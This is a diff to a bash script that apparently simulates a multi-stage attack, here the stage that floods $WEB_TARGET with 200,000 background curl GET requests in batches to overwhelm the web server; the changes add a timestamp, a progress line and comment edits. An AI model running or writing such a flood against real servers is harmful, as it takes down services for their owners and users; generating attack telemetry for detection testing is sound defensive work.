@@ -14,9 +14,9 @@ echo "[*] Phase 1 Complete. Pausing for 5 seconds to separate telemetry..."
 sleep 5
 
 # STAGE 2: Exploitation / Enumeration (Layer 7 Web Flood)
-
+date
 echo "[*] Phase 2: High-speed HTTP GET Flood against $WEB_TARGET..."
-# This loop fires 200000 background curl requests to overwhelm the web server
+# This loop fires 200000 background curl requests to overwhelm the web server in a sustained version
 
 for batch in {1..200}; do
   for req in {1..1000}; do
@@ -24,6 +24,7 @@ for batch in {1..200}; do
   done
   wait 
   sleep 0.5 # batch based rate limits
+  echo "$batch/200 has been completed" # Need a progress screen as data seems to be giving a stuff /loading signal 
 done
 
 echo "[*] Phase 2 Complete. Multi-stage attack simulation finished."
